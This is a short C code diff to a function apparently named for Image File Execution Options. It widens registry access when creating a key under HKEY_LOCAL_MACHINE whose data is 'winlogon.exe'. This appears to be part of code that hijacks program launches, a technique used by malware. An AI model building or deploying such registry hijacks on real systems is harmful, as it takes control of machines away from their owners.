@@ -97,7 +97,7 @@ void SetImageFileExecution(LPCWSTR lpProgramName)
  
 	HKEY hKey;
 	LPCWSTR lpData = L"winlogon.exe";
-	RegCreateKeyExW(HKEY_LOCAL_MACHINE, wRegPath, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
+	RegCreateKeyExW(HKEY_LOCAL_MACHINE, wRegPath, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL);
 
 	if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, wRegPath, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS)
 	{
